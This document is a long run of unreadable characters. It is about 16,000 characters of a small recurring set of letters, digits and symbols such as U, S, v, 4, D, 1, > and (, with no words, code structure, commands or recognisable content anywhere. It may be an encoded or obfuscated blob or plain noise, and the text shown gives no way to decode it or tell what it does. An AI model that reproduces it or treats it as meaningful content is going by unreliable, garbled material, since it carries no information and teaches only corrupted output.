(CI4>I->vU(S4vD8Upv4(1(>DUUScv  rSD4U1c>SD818Sr81It8r1I8tUSS8vS( r48I>tr-c8rKt4cv8k4I1>>-UvSSvSSry-4c (>4UDS48D(SIvr crUcU Urv1 t}DI-8r>1ItSSv8 -6 r!cI1>DJSIU> -y84-88D(cIDvc( 4+D8-1v>(U8>(IrSD1U8411(UUcS v8- 44rD4tScI >t-DSU  cS1>DvD4-vvI >vS481i> cQ-IIDh(+48>1->vUS8c8(S4cD>(r1It-cct81rc(>1vDcI UrS1vt Sj 4;1w>tUSI8vj IaVcI(>4Sr8D( 4Uv;(4I1>>-UU4Utvr((41DDU8v1XUr81(tv84(Ir111 Srr1 tAc4-USt Dr-IjU S1 r(c1r>>Ztc(r-USr4UcD4v>Dvv-UD8> 1c1Dvc>cDrvUcS-84 Uc>(cS4rUD(1Ztvc1 >rU+tg8IVtSS-88t>SD8S{vI N4I8D8L>4(>S-vv c8vSCI41>t-tcU(-r v4 84>DUUS>>U-c88 rD11cDrtW8S(p>SISD118Y v8vntIZt4S1U>-v8-(II-D U(I1D -UvS(v8 (rr(DcU4c( cr c  S44D1U>tDt cI -r4I  1r11UtSSvUSc+14>9S>8UmSvD38ItD XrI>>U-Svv( 49>4D1v> G4SDvU tIU-vr  r(1 tAc-1nt-c1 >rUo4rt18t1- 8vI11t>UF-41U88tcDU1DSvID vcDvr>I8c>->z8 Sr U7c (14>DUItDIt1ccD4t-c> UrS/Dr-Iv-(Sv88zv1>>SS-84>(vr(tI-(cc(I8 4vII1D8-UvS(v r((4cD>U8c1 D4UD- zr4D1U>cUS-St8Srr-4- cD8>C8Uv-vSrv(Jr1r>D#S4(> -:84cr8r(vID>-USLgrf4DDIUDvD -UcU(8Y>Urt}(8>1S8k17t(c1 >rUCr!->88)F111t>SU-1SIv!AvDv>c-1vD(>D->>-tv>(Y->v1(S4vD IvD8tvc4DDUScv  rTD4U1v>S-rS1It Sj 4-88tg>I(>-- 8(,(I(tU;UIS>vUvI-L4I1>>-4vS(v4 1 tvv1(D4UDIUvc  V241>U>ct Src1 1hc4v1Ft1Ut-Sv88BzI t1U>vv)SIc> -(84*4I>1U-Ivv(84p>r-1S-(UaS1rU c((44ID>>4cS v(>1^Urc1 1rU1StvS vDr411t>SU8SXSI >vD18IJ>IUm(-vv8(wr4D1->vI(S4UD >1v4 4DvDUUIcv rrPD4U1c>v(rS1tt S- 4r41>t48r8v&-I{rtS18DuUIS>v-SU4QrI1>>I8vS(c4 I0U4v1(r4UD>Uv-r #=JUSU>cr S(S1 tFc4 1(81UtDSv8t)_IFt1-b(rwSIt> Uc846II>>t-SvUSN4(>4-1cr(U4-DvUSt4(r41D>48cS cr 4JI8c1 rrU1>tvUv8m(4vrt>SI8SatI >1S4c1(PIU>D-vv-(24->1t>cS(S4tD Ucv4v>4>1>UIcv UrNI1U1c> U&UI-t S- 4rI1>tUSScv( IH>cS1v(mU4I>vUvclT44v>>U1vS(v4 1 vvv1 84UI>Uvc  E6.1-U>S  Srr1 tlc484kI1U>(Svv-b.14t1-18>WS4x> t884/1I>D>Ucvv(r4GD1-1v>(UrU1UU c4(4rrD>UUcS8Srt1PtIc1ctrU1Stv-vr>r4I1t>t88S?vI D 8U81(DIU1I-vv (irMS8->c>(Sr4D U0v4 4)SDUttcv8-rAD4U1c>8SrS1Dt -8 4r11>tUU 8vjUIPt4S18D9Ur1>c- vch48->>-tvS8c4 Dv11vI(>4U((Uvc8 794u(U>c4 SrU1 >(c4v1(D1tt1Sv8U6Ar8t1-18>OSID> Ut84e1I>1Utwvv(t4GDc-1S((UrUDSU cU(4rDD>UUcS8S2&1Tt-c18trU1Stv-v81r4ISt>UU8SWvI >Y-r81((IUDC-vvv(X4vr4-Dv4(S8rD U(v4 84>D1Ivcc  rP(tU1cD U(Sktt SS 4QB1>>tSScvc-IM>vS1v*:Ur >vUvvS}448>>-rvS(v4 IFtDv1 (4UDIUvSI za41tU>cr SrD1 > c4v1B11UtISv8t,.4St1U>cviSID> --84(II>1UUtvv(t4MDc-1SS(U4S( U8cS(4r D>UrcSvv8-1ntvc18orU44tvUU Ir4I t>>D8S:cI >8S4v_cUIt>S-vUc(5Ir>1-4tS(-4vD IDv4(I4>1>u8cv Ur^IIU1c> UrSTDt8SS 4rI1>ttSSvSs1Ij>vS1cUjUIS>vt c>H448>>-1vS c4 IMt8v1 (4UDIUvc8 f441SU>S! Srv1 tkc4 1xc1UtISv8tlwISt1S>v>0SI>> - 84wII>D>>rvv(U4QD4-1v>(U4SDUU cS(44ID>U>cSvvrI1Ktvc18lrUI1tvU 8vr4I t>S48S II >S-w81(gIUrU-vv8(YIr>1-4tS(-4vD I v4(I4>D1Ivcc  rg(tU1cD UiUv(t SS 4E(1>tUSScvv-Iu>vS1vZ=Uw7>vtUI1j44 >>I8vS(c4 I(-4cOSU4tDSUv>I %4rD1>>tI Sr>1 tvc4v4r>4UIDSv8UGxIvt1-v8U 1Ic> -S84S-I>>t-Sv1( 4vr1-Iv>(Uv(DvU8cT  8>DDUUcSS-r 1(U4S 81rU1StvS18<rr11t1SU8>c I8>bS4vSY>It>S-v>>(XI4>1-DvU(S4vD UQv4(14>DIUScv  ro1vU1c> Uv88I4s1(tDS(1>>SSS8vF  c94IztD-18D!81c>cU c=(84S>I(v4tDi-4v1U(vI >4DD-U4SvD1tFcU Srv,crr11t S8 rtS-I8 C+14IIIr>1-crv41Ir>-->r>(v4v>>--c (1IIDS8U t(crc1vU>c(1vUUcS v!v SUrcI >rD1StvS 8+Vc11tDSU8-PvIv>dU4c(*>It>S-cv (vI4D1UDvU(-4vD-U9v4(1r11UUScc  r D4U1c>8>r11vtvSA8(r11>tUSS84_ I t4SI8>A>IS1vD-vp(LI1>1-Uv-(v4 D1-4vI(>4>DSUcc  ?cSD1U>cU -rv1 tHcr 1r>1UtSSc8 Z!14t1Sr8UKSIvi1Ir>5cc84>>-Svv( r vI-1v>(U4-DvU c6(4cvD>UUcS cr 1HU4cI >rU1StvS48Mr411t>Uv8S9vI 4v4->>SDvcirI-S cUc8B4t>UtUUvI c4cS4crc1 -rt1-t(SS 8r4Ut UrI1vt S7tcS(84rr1D> -UIw>SS18>mU8r(-IU>r->v^Br4>vS(>4 DP-4UrUtcS(14IDt erSD1U>cUtUct 8rv1vtcSS ItSS-8 F_1443I8>D&SI4> -B84cSvI(-4vUU--v8(I4.>r(U4DDvU cCv1cS Ir-1v vrU1OU4c1t8SD 1rI14tcr414t>SU8SS8(t>n-D813>IU4tI1>--8vtND1I>IU>cU(D44Dc(1HcDUUScvSSSt 14I1-t(ct4vI>Icte(17Db>1r>-S-r^4(I4>t-Dvt(84U>cUyw->>-UvS ScrDZ-rv1 v4UDSUv- Sc44DIU>ct Sr>1 tS8- 1rD1UtDSv88E#14t1S4USG-Iv> -c84lII>>11vvc( 43IN-1vD(UrU8(U c((44rD>UUcS8SD11Ot)c18SrU1StvS t8rr1It>S>8SkSI >Sv-81^DIU1U-vv8(NI4>1-4tS(-4vD > v4(I4>1>)8cv 8r31-U1c> UwUSvt S  4rI1>tUSS8v(4I6>(S18>#UIS>vUvvv244L>>U/vS(v4 D6U(v1(14UDUUvcS F441(U>ct SrS1 t c48 L(1Ut-SvcvJB1rt1S>8UK>  >8-084 4I>>t-ScSUr4L>r-1v1(U4SDvU tD(r4ID>UtcS Sr I tDc1 1rU1ItvS 85(F4tt>SD8SMtI >zS4v4(DIU>>-vv8(gI4>1->c>(S4tD UVv4(14>1>tDcv Ur61SU1c> UrS1Dt Sv 46l1>t4SS8v0DIP>(S1840UIS>v- cIw4I4>>-UvS(S4 1ot-v1(D4UD>Uvcv eW_8tU>ct SrS1 tNc4 1181Ut-Sv88pVITt1U>-I5SIc> -(84(uI>>UU-vc(84xDj-1v>(U4>s U8c3(4(SD>UtcS8SSr13Urc18vrU1StvU -cr41It>St8S#>I >Sv-81bDIU1I-vv8({I4>1-4tS(-4vD >-v4(I4>D1Ivcc  rV4UU1cD U2Uv(t S( 4o-1>tUSS8vI1IR>jS18>PUIS>v- v1E4II>>->vS(c4 DE4Sv1(>4UD-Uvc  o4rD1U>cU Sr>1 t,c4 13_1UtSSv-r-t(1rII-tI#S4 > -P84S(v>L1I-DU--8rM(4(D4U1vr  4tc* -41D>UU>ttUS(8T4 I8UrcI8vtvSt89r411/(1I>>SD8-;44v81(xIU>S-vUc-rv1( 48>r(SrID Uxv4cIcr 1rc-vSUc(86rt->tvSv >r-I t1cI8SDU>ttc-cvv0>I(v>RUIS>vUv>SbrII>>-1vS(v4 Dwt(v1(D4UD-Uvcv .Z4ISU>ct Src1 tcc481(c1Ut-Sv8U2u14t1-18I)SIc> - 84w1I>D>Uvvv(v4=D -1v>(U4S14U c (44ID>U>cSvv8-1:t<c1 1rU1-tvS U>rr1It>S>8S?cI D UD81}DIU>t-vv ({rdI -Dv>(S4UD Ugv4(1r8DUUUcv 8r01NU1->8WrS1St S  4o(1>DUSD8vkvI)>MS1vAiUISD-- v(H4I4>>-tvS(vrDD/-4v1(D4UDSUvc8 J44D1U>ct Srv1 t{S8 1r>1UsS1-t8S18>>BS>8UeS4S(r-E84+1ID>U-Svv(v(U>4-Iv>(U4SDvU cu >41D>UUcU vr81aU41v >rU1StcS 8Yr411tDSU8SHvr8><S481}>48>S-vv c8vS3I4U>r-D8-  4(1cU>4>DrUScv  8v 8rr14t>Sc8It S8 4r11>/S1D>DV Ivt4S18>cJ8D+cISvu(4I1>>-UU4Utvr((41DDU8v1GUr81(tv84(Ir111 Sr11 tpc4-1St8DrrIUtDSr81t1SD8UKSIv>1-_8rx1I>>U-rv-DC81X(t1rIU> SrvUcc/(441D>UUcS(v8(1ktLc1 >rU(>4vScU1-vcv(tvmI8-(( >8S481x>IU>S-vv cTI4D8->vU(S8v(44(1-U(c1 DUSSc  rTD4I4DrtUS  Irc1(> S( 44DI>>8-v8(acI(8>((IS>v- UISrv8(U4(D>UtvS(c-4c((>4UDS1t1UUcc18dU>c4 Srv1 I8>vt4cD8crDSv8UpK14t1Ir>S-S8cdcID84(&I>>U-S>D-8vI(8-1cS(U4SDvItD(U-Sdw^r-1US-c> tr>1: >+(1StvS -8SS IR11ttt-U8-( -(r ^ 41>SLrur1Qt4>1U-vU(S4vrc4U>rUccU D4-1D-tcr8orUD4 Ui/1vt S0-cS(844D1D>S-U8t;(I(8>XIIS>v- t8-48I (4SvS(44 D2-4t U8c>(DI-D-t Sv (r1cU8crv1 tp1 UIS4 t4U1ttrSrv ,(>r>4SDv (S-88421I>>U-SvvY tr>4USv>(U4SrSrvDtU c8(rISDDtU v18U4c1 >rU1SZvrt-Hr4I-t>SU8ScXv(#81r>Uc>vvy-4I>-U 4(>1->vU(S4vD U9v4Uc4>DUUSSStrrYD4U1S1 UrS1vD >c 4r11>tUSS8-G 4 SvS18D!U4 >v- vZ y4c>>->vS(I4 Dh-4c4 -4UDtUvSt ,44D1t1S1 SrU1 D(c4 1r>I>>cSv8-=Y4rt1S>8U(UIS> -S84(SI>>U-ScS(44WDc-1SD(U4SDvtv>I(rrvD>t cS vr I tUc188rU4-tvS 8J(<I>t>- 8S (I >}S4v4  IUD(-vS8(}I4>1U1cr(SrwD >(v4(14>DUU1cv  rB1>U1c1 U(S(tt S( 4r11>t4SSvS/-Iz>jS1v4KUIS>vt c(R4I4>>->vS  4 ITtvv1(14UDUUv-  Ng4DIU>c> SrS1 >Sc4v1rI1UtUSv8v0HI8t1U>vrfSIS> - 84( I>>UIvvc(84z>r-1v1(UBSrtU c((44ID>tUcS8 8I1J>Ic1UrrU1-tvS88y5 (>tDSU8SStI >(S4v4U-IU>--vcS(CI4>1t>IS(S4cD U(v4 >4>IU>8cv 8rxDrU1-> U(S1Dt S( 4rI1>>4SScv(DIftrS18D.UID>vUvvIQ4I4>>U>vS(v4 I+USv1(14UDUUvcc 5{=1-U>cD SiP1 tlc4841T1Ut>Sv8Dh714t1-18tySIt> U-84b1I>D>U8vv(U4.1r-1v>(UrUI?U c-(4dID>UUcS8Srv1NtSc18vrU1Stv-v8tr4Ict>Ut8SAvI D Uv81(vIUDC-vv (0r}-S->c8(SYcD UZv4 4DvDUt cv8rrGD4U1S1:8rSI(t U( 4r11>>>U88v(XIiDrS18><UISDU- v d44>>>->vS v4DDP-rv1 14UDUUvc  144DIU>cU Src1 td-- 1r11UtSSv8vKZ14DvS>8DiSIv> - 8481(S>t-tvv 84g>r-1->c34-D-U S>(4dvD>tUSU vrv1ztUc1 IrUrS>1S 8 r4Itt>Sr8S(v4D>BSr81(vIU>U-vcv vI4>4->c1(S4vD >fc1(141DUUUcv8Dr.IY>Uc> 1rSI8t S& 4r118tUSU8v!SIY>uS1c>((IS>S- v ,4r(>>U>>?(v4SD&t1v1(>4UDSt>c   441=U>c> S(v18tbS5 1r11U>DSvvv(S14>MS>cvgSIv> -6v(#1I1>U->vv(v4i14ttv>(>4SDSU SD(4r41DUUc> vYc1<U4c1 >I41SttS 8(r411t>SUc lvIS>0-881G>IU>SUDv ( I4>1->vt(S4v11U{c.(14>DUU-cv  .1D4Urc> UrS1St SK8tr114tUSS8vPvIl14-D8>B1ISDc- v(M4;14 -tv>(vr1DxtSv1 >4rDSU-c  >441#U>UU8Irv1ctbSD 16 1U>S-18 Q 14>SS>8DVS4SD -_v(9144>U-Svv8 4t>4-rv>(D4S1IU S (r41DrUUSc vr 1)U4cc >rD1SttS 8 r441>USU8tBvIc>WU881(18 >S-tv  4I4>1->vU t4vDcUyc8(141DU>ScU  r8D4Urc>8IrSIStUSR88r14StUSS8vu 4>t4Sr8>hIIS>S- S)(1I1>I-Uvt(vrIDxt9cr(>4IDSt-c  z44D1SvcU 1rv1vt_c4 1r>>1tSSt8 /S14t1S>8U 8Iv>c-Q84T1ID>UUUcU( 48>4tfv>(U4SIvU4cn (41DIUUSv v( 1IU4cr >rD1SDvS cHrr11tISU8t=v4U>&U4c8.>ID>S--v (vI411U>vU(t4vDcUXc!(14>1vUSc-  r D4UIc> 1vv1ct S6tSr11DtU-UD(9 I(t4--8>=UIS>vv1v0(eI1>>-UvS(v4 D1-4vI(>4>DSUcc  xcSD1U>cU -rv1 tlc4 1r>1UtSSt8 Cg14t1-(8UdSIvmtIcD -88r(S41vv(U49>4-1t-t(8v(c4rDc(4r D>UUcSS-S( 4rv1ct(rUI tvS 8K8rv(G4I-cSvU8-(84 >4-tc(>SU v (RI4T(4>>1--cU(-Ir>(U(c4 14r1 Utr>D4U1c>8>c11ct8S& rr11>tUSSvUM I(t4SI8>M>IS1vUSviwrI1>D-Uvt(vr Dc-4vI(>41DSUvc 8 ztD1UDcU Drv1 t)-ov8r>1>tSSc8 .R14t1-78UBUIv>8-=v&61r>4I-SvS( 4 >4-4v>(Ur DvU8cy p41DDUUcSU1r 1#U4cI >rU1StcS 8br411> SU8S3vI >-S481A>8ruD4U>t-cv1  ->cU(S4vD 1(18tectIU11DctvcII4141ttDSt tOcSu8vr11>tU>t>8-R8S7-I88>HIIS>v- DE-(8I(S4vvS(t4 Ds-4t8-rcS <4Ic  I44D1U>>DUDSM -r8I v1818-#tI-t--814>wS>8U5SvD98ItD h1I1>U-Svv-( -1 -1v>(UrU8(U cY(4r8D>UUcS vDD1CU4c1 DrU1UtvSU?tr411t>-D8ShcI >VS4v5cUIt>S-vcc(VIr>1U11c(S4vD U(v4(14>DUvrcv  rgDrU1c1 U(SLtt S& 4r11>tDSScvv-IRt4S18>jUIU>v-U(th4I1>>-UvS(c4 D}-4cASU4tDSUvc  k4rD1t1Ic Srv1 tUc4 1r>4UIDSv8 W=14t1-C8U 1-F> -l8401I>>t-Svt( 4vr1-Iv>(U4SDvU8cV8hStD>UUcS Ur 1fU4S c8rt1-tvS 8!rr11tDSU8SD1I >CS481P>IU>S-vv4(bI4>1-1vU(-4vDS14vr(14>DUUScc  r^ SU1c> Ur-1vt S! 4rI1>tUSSSv! I:t4Srr8 (vvSvrtISDUt1>I-UvS(v4 D}14I_c>4UDDUvc  f8c (rU1 Urrv1StXc4 1v- trrI 8 +S14t1S>-Dv1vS<8II>8wr(D-1r8vvRvcSc-D1vI1DSkt>U 4 IIvDrUUUcU vr 1Z4I>8 >rI1StvS >Xcr8cX1ID8SzDI >oS4>8Srv1QIItDzUS4(>c-O8v(cIUv848P1(1r8DUUScvttcr8hr-1ItUc- -r-SQ81r11>tU>1tI-P8v4vIc>1-Dv>4-I>>t->v3>I14>vDT (r:(( UIt4UD>Uvc  YSc(Ir811 SrS1 t:c4U#v>1D( c4-(1(>cU DtrSmSI>> -i84vrvt(SI1>I-t48>4-1v>(U4SDvt t{(4rcD>UUcSS-c> (!6DIUIS1 DNSS 88r411t>IStD-DI >vS481g> Dbr44>-(8oD1c>D1UtD1>zID4v4 84>DUUStttGc( XrUDrU1rSIvt S# 4vv8rJc1-> -(8ty D4>t--v>rvI8D U II>>-Uc((v4 D;1>DD-Ivt  IvD4U(S- (r1cU Drv1 tmD tcS48vrDS-UUc4S>ID>>1D4 (8> --8431I>r4ID>-USvr Z>rvIv(t1t(4(4UIv8 r>UDcS vr 1<U4c1(>8-1tHIDtSIc44>81cv-chvIt>oS481c>vv*-4I>-U c(>1-4vU(S4v(t4(DDU(4>DIUScv  8I IrgDrtvrt1vt SO 4r11>tU>S8vxUITt4S1-I-v8r=t4gDvs441>>-UvSccc- v4IS1Sivt Ur(- S cI rrIDIttrv1St&c4 1v4 I24IU8 Mt14t1S>UcS-8D(dItD U(84aI-Sc(( 4_>41r>rUvvD(-rS-GS<cD IrDDDt-r 1SU4c1 >c- c4(18ttS111>8SU8S7v(>/c1r>U-4vj4UIcDv(04->1->vU-cv8r-44D8Utc8(Irtcv Ir{D4U1>(UIS>*-r>1tt>Sa81rIIv8v=cIbt4S1U8-D(->v->v574I1r>4-Dt-IcS(t4ID>--4UDSUvSvD-44D1U>S( Srv1 > SS 1rD1UDtSv8 .=44>1S>8t5SIc> -184 1I4>U--vv(84xIt-1S>(I4SDcU c((4(tD>>USS vr81uUrc1c:rU4S>>S 8(r41It>tS8S2vr>>OSr81H1IU>S-vv  DI4>1->vU(S4SD Uvt1(I4>DU4zcv 8r%I4t1c> IrS1Ut Ur 4P4tvtUSI8v SI{t4S18> (IS>t- v-24I4>>-4(r(v4-DWIUv1(D4UDSUvcSS44rD1U>D  Src1 D/S4 1rr1Ut>Sv8r{)4)SSS>8rVSLT> -N84=1r8>U-Dvv(t4!D0-1cor(4SDtU >>(44ID>UUcS Uv,1(U4c1UvrU1-tvU -cr4I(t>S18S8nI 1ir(81OrIU>D-vvS(9r4Dt->vI(S4tD t1v481r-DUUDcv -r&4SU1S1 1rS1>t -o 4r11>>>SD8vxtIs>8S18>^UrSDc- v-V448>>UIvS SrHDaUSv1 d4UDSUvSv4S441cU>-- Srv1 > -( 1bv1Ut-Sv8 0F4d>IS>v8sSrc> -a84(44>>UU vv 84:>4-1c1 S4S1(U c4(441D>t>SU vO51Wtcc1 >rUIU>0S 8rr441t>SU8S(St1>K-481 (IU>S-vcvI>I4DI->Sc(S4vD t U8(1r1DUt(cv  rnIH>Sc>8DrS4ct SO 4r1IitUSI8v(cIpt4S18>(4IS>>- vAy4II>>t4vU(v4-D%>>v1(D4UDtUvcSS44rD1U>Uv Src1 tv>1 Ir>1Ur6Sv88wm444(S>84=SIU> Ut84 1rD>t-1vv(U4N1v-1c1 >4SDDU S4(441D>>USt vrt1Ntcc18rrUIU>8S 8Ur4Irt>SU8S(SI>>?--81(IIU>S-vcv((I4DS->SI(S4vD UBvr(1r(DUtwcv vr61vI4cD 4rS(4t S( 4j81>t1Dv8cf ILrUS18DnUrS4t- vSu44R>>t(vS8v8-D9Uvv1 H4U4SUvSv 84418U>-D Srv1 DE-U 1N(1UtISvcvlY44DvS>8rzSID> UD84 144>U-Ivv(t4!1 -1S>884SDDU c-(4OcD>>USU vrt1Htcc1c>rU1Sr S88Sr4I t>Sr8S v(->E-v81(ZIU1r-vSUv_IrD ->> (S4cD U v4 u8UDtUScv-1rHDrU1S1>crS1>t Sr 4r11>tU>I8c6UIWtrS18DLU4UD8- vSk441>>-UvS8v4rDgUcv1(44U1rUv- 8A4418U>cr Srt1 t!SU 1A 1UtSSv8 AF14tIS>8rsSID> -U84n1Ir>U-1vv(v4;>r-1c1cD4-D>U c>(441D>UUc> vrU1oUrc1 1rU4S>US 8Sr4I t>->8S vIU>?-v81(0IU1I-vvU(cI4D ->> (S4cD U0v4 Q8UDtUScv-1r3DrU1S1>crS1>t SU 4r11>DU>D8v7UIX>vS1SviUr1>c- vSE48(>>-tvS(-4 Dv11vI(>4UFDUvc8 Fr +>UDcU Sv41 t(c4v18r1Ut1Sv8SCbr>t1U>-IeSI>> -S84 vI>14--vv(U4gwU-1vD(U&,DvUSt4(r41D>4 cS cr 1vI1cI >rUOUtvS88o=vI4t>SU8S04I >(S484u>I1rv-cv (}4U>1-DvU(Sv1D U=v4(I4>DUUScv  rzD4U1SU UrS1vt SS 4r11>IDIc> SU8t,cS1v8/UIS>vD>>t- v(1>1S>-U(v-DwUcv1(>4U{Sr9D8ttc8 4rIcU >rv1 tx1cUIS- ItS-v8 H!144vIr>cS-v ((It> c4vt(-4>tv-8c   -1cU(U4SDvI-1JU vI 44IDc--c-8vW 1ctUcr1StrS 8lr4(U)t1Dt--7  <11rDcSrv>>--vv8((I4D ->vU(S8( D14>rUtvrDUUrcv  r};4rUDD>(cD8S4S1(tcr1I(tUSS8vSt8c( I8tr-Sv1>v-tv<X4I14r4S>--Sv4(c4 v1 84UDSUvtcUUvr 44DDDt>ct8v>Dc4 1r>I>r1Sc88Y.I>t1S>8UmSIt> -(84YII>>>-SSv D4x>r-1vD(U4-Dvt c-(44ID>U>cS vr I t8c1 DrU11tvS 8Y(O1rt>S>8S(QI >OS481(8IU>U-vv8(04*>1t>UI(S4SD U v4 S4>DUt cv 8r01=U1cD Ur1tIt SL 4or1>ttSS8v? Iv41SI8>VU4t>v-8vx zct>>-tvS(U4 DN-4S1cr4UD-Uvc8 Or(D1>>tI Src1 t(c488r>4UIDSv88E91rt1-U8U S(t> -(84AII>>I-SSvc-4H>r-1vD(Ur(DvD U1(r4ID>tccS 1r 1vI1cI >rU4)tvS88}(:vtt>St8S*UI >JS4c1vrIU>--vv8(d4(>1t>UI(S4cD U(v4 84>IU1Dcv 8r_DrU1SU U(S6tt S( 4rI1>tISScvv-IPtrS18DQU4(>v> -1}rII>>UcvS(I4 D.4Sv1(>4UD-Uvc  Y4rD1U>cU Sr11 tYc4 1ZQ1UtSSv-cSr81B I8tr=SID> -H84-88r(1II>tU*cS>4U>v>(U4SJ-4-D1U8vr 4>U>8t8SG88N 1(t1rU1rtvS 8C8rv(x4I-cSv>88( ID81frIU>S-vD -88r(U4SvU(>4vD UK1c-Ic8 1USS(  rCD4I41t>(c-8jD D t8Sy4>ItIv>U3 I t4S18>S-(IDU- v_%444 --UvS(v4UD{-4v1(>D(DSUvc  (44D4U>c4rrrv1 tP-( 1rD1UtSSv8Sv41rt1S>vDFSIc> U DDL1I>>U-Uvv( 4K>4vcv>(U4SDcU c (4.1rrUUcS vr 1_Urc1v>8I1StvS 80r4I<t>S4zrwvI >dS481%DIU>S-vvSc4Ir>1->vU(S4cD t 1D(14>DUU4cv  rpI4I(c> UrS1vt S8 4  SStUSS8v* I_trS1v(fUI>r -8v&G4I1>>-tvS ScrDK-4v1(r4UDSUvcUvt4rDIU>cU Src1 t(c4 1D 1UtSSv8 _214t1S>vvgSIv> - 84lII>>11vvc( 4z>4-1vD(U4S(1U cK(44ID>UUcS vr81fU4c1cSrU1StvS 8vr411t>Irt-SIvS>!-181k>IUrtIt>4-cv( )t>tcUcc  crvD8U44>1(UScv  S- Ir41ctDSS crc1c 4nb1>tUSSU-SDv>38S1vuHUIS>vDc>1--v((U41vS(t4 D:-4ttUtv1(Dr2c  c44D1U>1UU-cI8v}8c48cr>1UtS>1t-S(8>(uI ->S-vS>c-{84)1I>>U-S8vc(488rc-c*8US(D -(Ur(44rD>UUcSt c-8-U4Sc >rU1Sr81(-cS18(A-I(tD--IctS  rrStcD1(  U (j44>1->vUc4ct(r4(D1UDc8(1IU18t(SvG44I11t1rt( D>>v44cIcS8r>S8vbtIJt4S1U>-v8-(II-D U(I1>r-UvS(v8S(tr DU-r4UD1Uvc  78( DrUD4UrcD1 t c4 1r>(14SSv8DV<14t1D-ttSIv ,D4vD8-a8r>UU(vv( 4Tr>4D>I-tc zv44D(t-c( 1UDcS vr 17U4c1 >8U1tv44>-vt4}1c rDrcjvIc>nS481c8vD4---v (pI4>1->vU(S4vDcItDUIt1t ;tc> S rV1DU1c> UvU88,D1(t>(1(1rI1>cvv884( S1v8+UIS>vD8DcU vD1>D4>-USvrDwUtv1(>4UrI4t1SS8cS crSD1tUct8,t!Sc 1r>1UIDI t8S 8>h(148tXSIv>S-Z84}1 -NtIrD ( 44>4-1v>c4vr  4StSU-c4 Ir1ttU1cD 1r c18(rU1Stv1ttc- 88rrIS>1mvIv>VS481St(r>S-Uv (BI4(8IDDc-D4vDSUNv4(184(Ir41U  rtD4U1c>SDc4 c)v1(t(-W r3>SS81X I,t4D1>t-D8r(UID>r-1I1D;-UvS(v crSrp>IU-vIDt(c I S748-UUv-4crv1Utdc4 1ct -481ctDS4I(t1S>8U_SIvr rv-4514(>U-SvvSUvc((r{DtU>(t(8U cM(4r4c(UUcS vrt17U4c181Bc1StcS cvr411t>UUvc!vI8>XSr81MIIU1S-Dv ((I4>I->- (Siv1(Uhvr(14DDUt cvv r>D4UIc> trS1tt U*8Ur11DtUS-8v(rI9t4tv8>OtIS>S- vg/4I11c-UvS(v4 DwU{v1(48SD-Uvc -144DIU>-U8Srv1-tTS  1( 1U>U 48 ^-14> S>8UjSIvDD-Gv8V14(>U-Uvv(UDt>4U(v>-v4SDcU c+(4rXjUUtcS vv41YUrc1v>pU1SttS 8vr44It>->!k0vIt>T-S81*>IU>SUIv (cI4D8->v>(S4>ttUOc8(1rrDUU-cv 8rj1 I>cD UrSItt S( 4#)(UttSS8vc4IJtrS1c>vIIS>t- vvH44v>>tU1t(v4-D.U8v18>4UIStuc  c441(U>St S(vIIt5S8 1rr1UDDSvvvB114> S>vDOSIv> U v1E14(>Ut4vv( 4&14U(v>(r4SDDU cD(4r4D1UUc4 vrr1!U4c181D41StIS v>r411t>->vS#vI1>+-I81&>IUDUUcv (DI418->vU(SrSDcU_c>(178DUUScv8vrcD4ttc>8 rS1vt - 8(r1IUtU-r8v? IsD6-S8>(-IS>I- vdn444-v-UcS(vrDDy-4v1 1D DStcc vt44D1U>S>IIrvIvt6-- 1r>1U>U-S8 (814D8S>8U)SIv>r-lvcJ14I>U-Svv( r->4U v>(U4SDcU -S D41DrUUD  vr81}>tc1 4vS1-tvS U1r41It>UU-DYvIU>u- 81(UIU1Stcv8(SI4D ->v1(SrSDvU+cc(1(SDUUScvv ;8D4t8c> rrS1rt - vDr1I tU-18vA IgDzU(8>((ISD>- v;J444D -Ucx(v4DDP-4v1(>41DSUDc  >44D4U>c4r8rv1UtAtc 1rD1UtISv8Sv41rt1S>SroSIc> -vU1}II>>UI vv(84i141(v>(44SDUU c4(4x1)rUUc1 vrU1ODcc181r11StDS cvr411t>UUv8JvIt>W-c81(>IU1S-Iv (-I4D8->cI(S.v1UUbcc(1r(DU>1cvv r1D4t8c> rrSI t U<v-r1I(tUSI8v tI_t41>8DH4IS>>- v-E4r14r-Uv1(v4UD<t v1vK(UD-U>c -144DIU>U8 SrU(Mt(c4 1cS1Ut-Svvv-I14> S>8tOSIv> -_Uc!I4A>U--vv(84i1pU v>(44S1-U cx(4C11 UUcI vrS1/t1c1v>r>1StDS 8-r4rvt>SUv(uvI>>VS481E>IU>SUtv (-I4D8->c/(S4vDDUscv(141DUU-cv8v tD4t c>v>rS1vt S_8kr1IMtUS-8v*vIQD4SI8>k4IS>>- c %4r1>4-Uv1(v4UDjt>v1 xr1DSU>c - 44DIU>ct SrU(Ct(c4 1v11Ut-Sv8Sv41rt1S>tvySIc> U DD.14e>Uttvv( 4k141(v>(44SD>U c (4( DDUUc1 vvt15Urc1vcrU1>4 S88Wr4 8t>St8SiU a>(S481SSIU>--vS ccI4D ->v1(S41D >%t8(1rfDUU1cvv6rZ4vUIc> 4rS ^t S( 4(D1>t1Dv8c0 I2r>S18DNUI>r -8v/N4(r>>-tvS(>rvD0-4v1 v4UD-Uvcv zr }>UDcU Sr41 t(c4 1S 1UtSSv88:e14t1S>8U5SIv> -S84l1I>>U-1vv( 4Pr(4DDU-4vr(DU cS(441D>Ic1r- c8 Ir8c18(rU1Stv1ttc- 88rrIS>1_v4H>KS481crvUa>IcDS-c8IrrIrD1U>vI #4-v4 c4>DUUS>-tScr 44gI(UIcD8 t St 4r11>ItID>U-(rb4v1I>1-c4S>v- v9 Yv >D-tvS(-4 Dk-4v1 D4UD-Uvc8 7reD1>>St Src1 t(c4 Ir>IUt-Sv88AmIvt1S>8U(U44> -(84(:I>>U-ScS >4zDC-1vI(U4SDvU cS(444D>UtcS Sr 4KI8c1 1rU1UtvSv8jr4 StDSt8S9SI >(S4v4R4IU>--vv-(NI4>1U1S4(-4SD U8v4(14>DUUIcv vr_DrU1c1 U(S1Dt S  4r41>ttSScv((I_>mS181wUI1>v- c k4II>>->vS(c4 D2Ucv1(>4UD-Uvc  !4rD1U>cU Si41 t/c4 17v1UtSSv-1c8(I4>>r>SStv82SIc84(SI>>U-SUD--cvJ(4(D1U4vr(-4-cJ >41D>UUttt8SA8vr81>t4 c(>%II tcr41rt>SU8S--vDT4S4vb&>IU>S1 >8-Iv8>1USvU(S4v(>rv1 U1vt >4D1ct-cc8(gBc> 4rS1vt 1StIS48-rtI>8vKUI%t4S1U-SIv>Z14(>vM44 